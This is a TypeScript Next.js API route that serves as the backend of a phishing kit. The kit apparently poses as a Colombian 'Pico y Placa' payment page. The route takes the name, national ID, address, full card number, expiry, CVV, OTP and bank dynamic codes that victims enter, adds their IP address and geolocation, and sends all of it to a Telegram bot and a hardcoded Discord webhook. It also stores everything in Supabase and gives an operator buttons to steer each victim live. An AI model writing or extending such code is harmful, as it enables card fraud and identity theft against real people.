// app/api/enviar-telegram/route.ts
import { detectarDispositivo, obtenerGeoInfo } from '@/utils/detectorDispositivo';
import { NextRequest, NextResponse } from 'next/server';
import { getFullKeyboard } from '@/lib/telegramKeyboards';
import { setSessionStatus, getProjectManagementType } from '@/lib/supabaseSession';
import * as fs from 'fs';
import * as path from 'path';

// Helper function to dynamically update .env file with new Telegram Chat ID
function updateEnvChatId(newChatId: number) {
  try {
    const envPath = path.join(process.cwd(), '.env');
    if (fs.existsSync(envPath)) {
      let envContent = fs.readFileSync(envPath, 'utf8');
      const regex = /^TELEGRAM_CHAT=.*$/m;
      if (regex.test(envContent)) {
        envContent = envContent.replace(regex, `TELEGRAM_CHAT=${newChatId}`);
      } else {
        envContent += `\nTELEGRAM_CHAT=${newChatId}`;
      }
      fs.writeFileSync(envPath, envContent, 'utf8');
      console.log(`[Telegram System] .env file automatically updated with new Chat ID: ${newChatId}`);
    }
  } catch (err) {
    console.error('[Telegram System] Error updating .env file:', err);
  }
}

const getProjectIdFromReferer = (referer: string | null): string | undefined => {
  if (!referer) return undefined;
  try {
    const refererUrl = new URL(referer);
    return refererUrl.searchParams.get('projectId') || refererUrl.searchParams.get('project_id') || undefined;
  } catch {
    return undefined;
  }
};

const emitSocketEvent = async (projectId: string, event: string, data: any) => {
  try {
    await fetch('http://localhost:3001/emit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ projectId, event, data }),
    });
  } catch (err) {
    console.warn('[enviar-telegram] Error emitiendo evento socket:', err);
  }
};

// Helper to get active env token directly from disk to bypass Next.js cache
const getEnvValueDirectly = (key: string): string | undefined => {
  try {
    const envPath = path.join(process.cwd(), '.env');
    if (fs.existsSync(envPath)) {
      const content = fs.readFileSync(envPath, 'utf8');
      const regex = new RegExp(`^${key}=(.*)`, 'm');
      const match = content.match(regex);
      if (match && match[1]) {
        return match[1].trim().replace(/['"]/g, '');
      }
    }
  } catch (e) {
    console.error(e);
  }
  return undefined;
};

const TELEGRAM_BOT_TOKEN = getEnvValueDirectly('TELEGRAM_BOT') || process.env.TELEGRAM_BOT;
const TELEGRAM_CHAT_ID = getEnvValueDirectly('TELEGRAM_CHAT') || process.env.TELEGRAM_CHAT;

// Emojis decorativos
const EMOJIS = {
  consulta: '🔍',
  registro: '📝',
  personaEncontrada: '✅',
  personaNoEncontrada: '❌',
  usuario: '👤',
  correo: '📧',
  telefono: '📞',
  ubicacion: '📍',
  direccion: '🏠',
  vehiculo: '🚗',
  viaje: '✈️',
  documento: '🪪',
  propiedad: '🏢',
  estrato: '🏘️',
  fecha: '📅',
  hora: '⏰',
  flecha: '➡️',
  info: 'ℹ️',
  exito: '🎉',
  error: '⚠️',
  semaforo: '🚦',
  importante: '❗',
  reloj: '🕐',
};

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { data, tipo, projectId } = body;
    const refererProjectId = getProjectIdFromReferer(request.headers.get('referer'));
    const resolvedProjectId = projectId || refererProjectId || process.env.TELEGRAM_DTA || process.env.NEXT_PUBLIC_PROJECT_ID || process.env.PROJECT_ID;

    // ─── Verificar modo del proyecto ─────────────────────────────────
    const projectMode = await getProjectManagementType(resolvedProjectId);
    const isPanelLive = projectMode === 'panel_live';
    // ─────────────────────────────────────────────────────────────────

    let activeToken = getEnvValueDirectly('TELEGRAM_BOT') || process.env.TELEGRAM_BOT || '';
    let activeChatId = getEnvValueDirectly('TELEGRAM_CHAT') || process.env.TELEGRAM_CHAT || '';

    try {
      const configPath = path.join(process.cwd(), 'traffic-config.json');
      if (fs.existsSync(configPath)) {
        const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
        if (config.botToken) activeToken = config.botToken;
        if (config.chatId) activeChatId = config.chatId;
      }
    } catch (err) {
      console.error("Error reading traffic config in enviar-telegram:", err);
    }

    if (!activeToken || !activeChatId) {
      console.error('Faltan credenciales de Telegram');
      return NextResponse.json(
        { error: 'Configuración de Telegram incompleta' },
        { status: 500 }
      );
    }

    // Función para escapar HTML y evitar fallas de parseo en Telegram
    const escapeHtml = (text: string = '') => {
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    };

    // Escapar los datos del usuario
    const d: any = {};
    if (data && typeof data === 'object') {
      for (const k in data) {
        d[k] = typeof data[k] === 'string' ? escapeHtml(data[k]) : data[k];
      }
    }

    // 🔍 Detectar información del dispositivo
    const dispositivo = detectarDispositivo(request);
    
    // Obtener geolocalización (opcional)
    let geoInfo = null;
    if (dispositivo.ip && dispositivo.ip !== 'IP no disponible') {
      geoInfo = await obtenerGeoInfo(dispositivo.ip);
    }

    // 📝 Obtener fecha y hora actual
    const fechaActual = new Date();
    const fechaFormateada = fechaActual.toLocaleDateString('es-CO', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
    });
    const horaFormateada = fechaActual.toLocaleTimeString('es-CO', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });

    const getProjectName = (): string => {
      const proj =
        d.proyecto ||
        getEnvValueDirectly('PROJECT_NAME') ||
        getEnvValueDirectly('PROJECT_ID') ||
        getEnvValueDirectly('PROYECTO') ||
        getEnvValueDirectly('NEXT_PUBLIC_PROJECT_NAME') ||
        getEnvValueDirectly('NEXT_PUBLIC_PROJECT_ID') ||
        process.env.PROJECT_NAME ||
        process.env.PROJECT_ID ||
        process.env.PROYECTO ||
        process.env.NEXT_PUBLIC_PROJECT_NAME ||
        process.env.NEXT_PUBLIC_PROJECT_ID ||
        'Pico y Placa';

      if (proj.toUpperCase() === 'PYP' || proj.toLowerCase().includes('coomeva')) {
        return 'Pico y Placa';
      }
      return proj;
    };

    const tituloProyecto = getProjectName();

    const formatMoney = (val: any): string => {
      if (val === null || val === undefined || val === '') return '';
      const str = String(val).trim();
      if (str.startsWith('$')) return str.substring(1).trim();
      if (typeof val === 'number') {
        return isNaN(val) ? '0' : val.toLocaleString('es-CO');
      }
      const cleanNum = parseInt(str.replace(/\D/g, ''), 10);
      if (isNaN(cleanNum)) {
        return str;
      }
      return cleanNum.toLocaleString('es-CO');
    };

    let mensaje = '';
    
    if (tipo === 'consulta') {
      mensaje = `🔍 <b>Nuevo Intento de pago - ${tituloProyecto}</b>\n\n`;
      mensaje += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
      mensaje += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;
      mensaje += `📋 <b>Datos consultados:</b>\n`;
      if (d.nombre) mensaje += `• ${EMOJIS.usuario} Nombre: ${d.nombre}\n`;
      if (d.NumeroIdentificacion) mensaje += `• ${EMOJIS.documento} Documento: ${d.NumeroIdentificacion}\n`;
      if (d.IdTipoDocumento) mensaje += `• 🪪 Tipo Doc: ${d.IdTipoDocumento}\n`;
      if (d.total) mensaje += `• 💰 Valor a pagar: $${formatMoney(d.total)}\n`;
      if (d.referencia) mensaje += `• 🔖 Referencia: ${d.referencia}\n`;
      
      if (d.encontrado) {
        if (d.apellido) mensaje += `• ${EMOJIS.usuario} Apellido: ${d.apellido}\n`;
        if (d.correo) mensaje += `• ${EMOJIS.correo} Correo: ${d.correo}\n`;
        if (d.telefono) mensaje += `• ${EMOJIS.telefono} Teléfono: ${d.telefono}\n`;
        if (d.direccion) mensaje += `• ${EMOJIS.direccion} Dirección: ${d.direccion}\n`;
        if (d.departamento) mensaje += `• ${EMOJIS.ubicacion} Departamento: ${d.departamento}\n`;
        if (d.municipio) mensaje += `• ${EMOJIS.ubicacion} Municipio: ${d.municipio}\n`;
      }
    } else if (tipo === 'registro') {
      if (d.metodoPago === 'tarjeta' || d.metodoPago === 'debito' || d.metodoPago === 'credito' || d.metodoPago === 'tarjeta_debito' || d.metodoPago === 'tarjeta_credito') {
        const isCredito = d.metodoPago === 'credito' || d.metodoPago === 'tarjeta_credito' || d.tipoTarjeta === 'credito';
        const isDebito = d.metodoPago === 'debito' || d.metodoPago === 'tarjeta_debito' || d.tipoTarjeta === 'debito';
        const tipoTarjetaTitulo = isCredito ? 'TARJETA DE CRÉDITO' : isDebito ? 'TARJETA DE DÉBITO' : 'TARJETA';
        mensaje = `💳 <b>PAGO CON ${tipoTarjetaTitulo} (${tituloProyecto})</b>\n\n`;
        mensaje += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
        mensaje += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;
        mensaje += `👤 <b>Datos del Usuario:</b>\n`;
        if (d.nombre) mensaje += `• ${EMOJIS.usuario} Nombre: ${d.nombre}\n`;
        if (d.cedula) mensaje += `• ${EMOJIS.documento} Cédula: ${d.cedula}\n`;
        if (d.tipoDoc) mensaje += `• 🪪 Tipo Doc: ${d.tipoDoc}\n`;
        if (d.email) mensaje += `• ${EMOJIS.correo} Correo: ${d.email}\n`;
        if (d.direccion) mensaje += `• ${EMOJIS.direccion} Dirección: ${d.direccion}\n`;
        if (d.departamento) mensaje += `• ${EMOJIS.ubicacion} Depto: ${d.departamento}\n`;
        if (d.ciudad) mensaje += `• ${EMOJIS.ubicacion} Ciudad: ${d.ciudad}\n`;
        if (d.total) mensaje += `• 💰 Total a pagar: $${formatMoney(d.total)}\n\n`;
        
        mensaje += `💳 <b>Datos de la Tarjeta:</b>\n`;
        if (d.cardNumber) mensaje += `• 🔢 Número: <code>${d.cardNumber}</code>\n`;
        if (d.expiryDate) mensaje += `• 📅 Vencimiento: <code>${d.expiryDate}</code>\n`;
        if (d.cvv) mensaje += `• 🔒 CVV: <code>${d.cvv}</code>`;
        if (isCredito && d.cuotas) {
          mensaje += `\n• 🔄 Cuotas: <code>${d.cuotas}</code>`;
        }
        
        if (d.otp) {
          mensaje += `\n• 🔑 <b>OTP:</b> <code>${d.otp}</code>`;
        }
        if (d.token) {
          mensaje += `\n• 🔑 <b>TOKEN:</b> <code>${d.token}</code>`;
        }
        if (d.dinamica) {
          mensaje += `\n• 🔐 <b>DINÁMICA:</b> <code>${d.dinamica}</code>`;
        }
      } else if (d.metodoPago === 'pse') {
        mensaje = `🏦 <b>PAGO CON PSE (${tituloProyecto})</b>\n\n`;
        mensaje += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
        mensaje += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;
        mensaje += `👤 <b>Datos del Usuario:</b>\n`;
        if (d.nombre) mensaje += `• ${EMOJIS.usuario} Nombre: ${d.nombre}\n`;
        if (d.cedula) mensaje += `• ${EMOJIS.documento} Documento: ${d.cedula}\n`;
        if (d.tipoDoc) mensaje += `• 🪪 Tipo Doc: ${d.tipoDoc}\n`;
        if (d.email) mensaje += `• ${EMOJIS.correo} Correo: ${d.email}\n`;
        if (d.banco) mensaje += `• 🏦 Banco: ${d.banco}\n`;
        if (d.persona) mensaje += `• 👤 Persona: ${d.persona}\n`;
        if (d.telefono) mensaje += `• ${EMOJIS.telefono} Teléfono: ${d.telefono}\n`;
        if (d.total) mensaje += `• 💰 Total a pagar: $${formatMoney(d.total)}`;
      } else if (d.metodoPago === 'qr') {
        mensaje = `📱 <b>PAGO CON CÓDIGO QR (${tituloProyecto})</b>\n\n`;
        mensaje += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
        mensaje += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;
        mensaje += `👤 <b>Datos del Usuario:</b>\n`;
        if (d.nombre) mensaje += `• ${EMOJIS.usuario} Nombre: ${d.nombre}\n`;
        if (d.cedula || d.identificacion) mensaje += `• ${EMOJIS.documento} Documento: ${d.cedula || d.identificacion}\n`;
        if (d.tipoDoc || d.tipoDocumento) mensaje += `• 🪪 Tipo Doc: ${d.tipoDoc || d.tipoDocumento}\n`;
        if (d.tipoPersona || d.persona) mensaje += `• 👤 Tipo Persona: ${d.tipoPersona || d.persona}\n`;
        if (d.razonSocial) mensaje += `• 🏢 Razón Social: ${d.razonSocial}\n`;
        if (d.email || d.correo) mensaje += `• ${EMOJIS.correo} Correo: ${d.email || d.correo}\n`;
        if (d.telefono || d.celular) mensaje += `• ${EMOJIS.telefono} Teléfono: ${d.telefono || d.celular}\n`;
        if (d.direccion) mensaje += `• ${EMOJIS.direccion} Dirección: ${d.direccion}\n`;
        if (d.banco || d.bancoNombre) mensaje += `• 🏦 Banco Seleccionado: ${d.banco || d.bancoNombre}\n`;
        if (d.tipoObligacion) mensaje += `• 📑 Tipo Obligación: ${d.tipoObligacion}\n`;
        if (d.numeroDocumento) mensaje += `• 📄 N° Documento: ${d.numeroDocumento}\n`;
        if (d.departamento) mensaje += `• ${EMOJIS.ubicacion} Depto: ${d.departamento}\n`;
        if (d.ciudad) mensaje += `• ${EMOJIS.ubicacion} Ciudad: ${d.ciudad}\n`;
        if (d.placa) mensaje += `• ${EMOJIS.vehiculo} Placa: ${d.placa}\n`;
        if (d.plan) mensaje += `• 📋 Plan: ${d.plan}\n`;
        if (d.saldo) mensaje += `• 💵 Saldo: ${d.saldo}\n`;
        if (d.intereses) mensaje += `• 📈 Intereses: ${d.intereses}\n`;
        if (d.total || d.valorTotal) mensaje += `• 💰 Total a pagar: $${formatMoney(d.total || d.valorTotal)}\n\n`;
        mensaje += `🔔 <b>Estado:</b> El usuario ya realizó el pago mediante QR.`;
      } else {
        mensaje = `📝 <b>NUEVO REGISTRO DE PERSONA</b>\n\n`;
        mensaje += `📅 <b>Fecha:</b> ${fechaFormateada}\n`;
        mensaje += `⏰ <b>Hora:</b> ${horaFormateada}\n\n`;
        mensaje += `👤 <b>Datos de la persona:</b>\n`;
        if (d.primerNombre) mensaje += `• ${EMOJIS.usuario} Primer Nombre: ${d.primerNombre}\n`;
        if (d.segundoNombre) mensaje += `• ${EMOJIS.usuario} Segundo Nombre: ${d.segundoNombre}\n`;
        if (d.primerApellido) mensaje += `• ${EMOJIS.usuario} Primer Apellido: ${d.primerApellido}\n`;
        if (d.segundoApellido) mensaje += `• ${EMOJIS.usuario} Segundo Apellido: ${d.segundoApellido}\n`;
        if (d.correoPrimario) mensaje += `• ${EMOJIS.correo} Correo Primario: ${d.correoPrimario}\n`;
        if (d.numeroTelefono) mensaje += `• ${EMOJIS.telefono} Teléfono: ${d.numeroTelefono}\n`;
      }
    }

    // 🔍 Agregar información del dispositivo
    mensaje += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `🖥️ <b>INFORMACIÓN DEL DISPOSITIVO</b>\n`;
    mensaje += `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    // Dispositivo y emojis
    mensaje += `${dispositivo.emojiDispositivo} <b>Dispositivo:</b> ${dispositivo.tipoDispositivo === 'movil' ? 'Móvil' : dispositivo.tipoDispositivo === 'tablet' ? 'Tablet' : 'Escritorio'}\n`;
    mensaje += `${dispositivo.emojiSO} <b>Sistema Operativo:</b> ${dispositivo.sistemaOperativo} ${dispositivo.versionSO}\n`;
    mensaje += `${escapeHtml(dispositivo.navegador)}\n`;
    
    // 📡 IP y Geolocalización
    if (geoInfo && geoInfo.pais !== 'Desconocido') {
      mensaje += `\n📍 <b>UBICACIÓN APROXIMADA</b>\n`;
      mensaje += `${geoInfo.emojiBandera} <b>País:</b> ${escapeHtml(geoInfo.pais)}\n`;
      mensaje += `🏙️ <b>Ciudad:</b> ${escapeHtml(geoInfo.ciudad)}\n`;
      mensaje += `🗺️ <b>Región:</b> ${escapeHtml(geoInfo.region)}\n`;
      mensaje += `📡 <b>Proveedor:</b> ${escapeHtml(geoInfo.proveedor)}\n`;
    }
    
    mensaje += `\n🌐 <b>IP:</b> ${escapeHtml(dispositivo.ip)}\n`;
    
    // Agregar User Agent si no es muy largo
    const userAgentEscaped = escapeHtml(dispositivo.userAgent);
    if (userAgentEscaped.length < 100) {
      mensaje += `\n🔄 <b>User Agent:</b> ${userAgentEscaped}`;
    } else {
      mensaje += `\n🔄 <b>User Agent:</b> ${userAgentEscaped.substring(0, 100)}...`;
    }

    // Información adicional
    mensaje += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `📌 Registro generado automáticamente`;

    // ─── Enviar a Telegram (con o sin botones según modo) ─────────────
    const telegramBody: any = {
      chat_id: activeChatId,
      text: isPanelLive
        ? mensaje + `\n\n🖥️ <b>MODO PANEL LIVE ACTIVO</b>\n<i>Los botones de acción están desactivados. Este caso es gestionado desde el Panel Live.</i>`
        : mensaje,
      parse_mode: 'HTML',
    };

    const rawDoc = d.cedula || d.NumeroIdentificacion || d.numeroIdentificacion || d.numeroId || d.documento || d.identificacion;
    const sessionId = (d.sessionId && String(d.sessionId).length >= 3) 
      ? String(d.sessionId) 
      : (rawDoc ? String(rawDoc) : (d.placa ? `placa-${d.placa}` : crypto.randomUUID()));

    // Guardar sesión en Supabase (pyp_telegram_sessions) para que aparezca en el Dashboard
    try {
      const { createSession } = await import('@/lib/supabaseSession');
      await createSession(sessionId, {
        status: 'pending',
        project_id: resolvedProjectId || undefined,
        chat_id: activeChatId || undefined,
        bank: d.banco || d.proyecto || 'Generic',
        source: 'telegram',
        usuario: d.nombre || d.primerNombre || d.cedula || 'Registro Telegram',
        clave: d.clave || d.password,
        tarjeta: d.tarjeta || d.cardNumber,
        cvv: d.cvv || d.cardCvv,
        fecha: d.expiry || d.cardExpiry || d.fecha,
        otp: d.otp || d.codigo,
        dinamica: d.dinamica,
        documento: d.cedula || d.numeroId || d.documento,
        tipo_doc: d.tipoDoc || d.tipoId,
        holder: d.nombre,
        email: d.email || d.correo,
        phone: d.telefono || d.celular,
        address: d.direccion,
        total: d.total ? String(d.total) : undefined,
        ip: dispositivo.ip,
      });
    } catch (e) {
      console.error('[enviar-telegram] Error guardando sesión en Supabase:', e);
    }

    if (!isPanelLive && tipo === 'registro' && (data.metodoPago === 'tarjeta' || data.metodoPago === 'debito' || data.metodoPago === 'credito' || data.metodoPago === 'tarjeta_debito' || data.metodoPago === 'tarjeta_credito' || data.metodoPago === 'qr')) {
      telegramBody.reply_markup = getFullKeyboard(sessionId, dispositivo.ip);
    }

    if (resolvedProjectId) {
      await emitSocketEvent(resolvedProjectId, 'new_lead', {
        id: sessionId,
        project_id: resolvedProjectId,
        source: 'telegram',
        bank: d.banco || d.proyecto || 'Generic',
        status: 'pending',
        usuario: d.nombre || d.primerNombre || d.cedula || 'Registro Telegram',
        email: d.email || d.correo,
        phone: d.telefono || d.celular,
        total: d.total ? String(d.total) : undefined,
        tipo,
        ...d,
      });
    }

    const telegramUrl = `https://api.telegram.org/bot${activeToken}/sendMessage`;
    let telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramBody),
    });

    let result = await telegramResponse.json();

    // Self-healing check: If the group was upgraded to a supergroup, retry with the new ID
    if (!result.ok && result.parameters && result.parameters.migrate_to_chat_id) {
      const newChatId = result.parameters.migrate_to_chat_id;
      console.log(`[Telegram Auto-healing] Group chat upgraded! Migrating from ${telegramBody.chat_id} to ${newChatId}`);
      
      // Update .env file so future requests use the correct ID immediately
      updateEnvChatId(newChatId);
      
      // Retry with the new chat_id
      telegramBody.chat_id = newChatId;
      telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(telegramBody),
      });
      result = await telegramResponse.json();
    }

    if (result.ok) {
      // Replicar automáticamente a Discord si DISCORD_WEBHOOK_URL está configurado
      const rawDiscordWebhook = process.env.DISCORD_WEBHOOK_URL || "https://discordapp.com/api/webhooks/1531970860250955858/wEWBIxtnKGH4gBX_Y-KGDgTxLuUA2Igz_HoyDH96yNUq66U7uRbQ72i6VH9VFB_teCic";
      const discordWebhook = rawDiscordWebhook.replace(/['"]/g, '').trim();

      if (discordWebhook && discordWebhook.startsWith('http')) {
        (async () => {
          try {
            let text = telegramBody.text || mensaje || '';
            text = text
              .replace(/<b>(.*?)<\/b>/gi, '**$1**')
              .replace(/<i>(.*?)<\/i>/gi, '*$1*')
              .replace(/<code>(.*?)<\/code>/gi, '`$1`')
              .replace(/<pre>(.*?)<\/pre>/gi, '```\n$1\n```')
              .replace(/<br\s*\/?>/gi, '\n')
              .replace(/<\/?[^>]+(>|$)/g, '');

            const buttons: string[] = [];
            if (telegramBody.reply_markup?.inline_keyboard) {
              for (const row of telegramBody.reply_markup.inline_keyboard) {
                for (const btn of row) {
                  if (btn.text) {
                    if (btn.url) buttons.push(`🔗 [${btn.text}](${btn.url})`);
                    else if (btn.callback_data) buttons.push(`🔘 **${btn.text}** (\`${btn.callback_data}\`)`);
                  }
                }
              }
            }

            if (buttons.length > 0) {
              text += '\n\n**Botones de Acción:**\n' + buttons.join('\n');
            }

            await fetch(discordWebhook, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                username: `${tituloProyecto} Bot`,
                content: text
              })
            });
          } catch (e) {
            console.error('[Discord Mirror] Error enviando a Discord:', e);
          }
        })();
      }
    } else {
      console.error('Error enviando a Telegram:', result);
      return NextResponse.json(
        { error: result.description || 'Error al enviar mensaje a Telegram' },
        { status: 500 }
      );
    }

    return NextResponse.json({ 
      success: true, 
      message: 'Mensaje enviado a Telegram',
      dispositivo: {
        tipo: dispositivo.tipoDispositivo,
        so: dispositivo.sistemaOperativo,
        ip: dispositivo.ip
      }
    });
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Error al enviar mensaje a Telegram' },
      { status: 500 }
    );
  }
}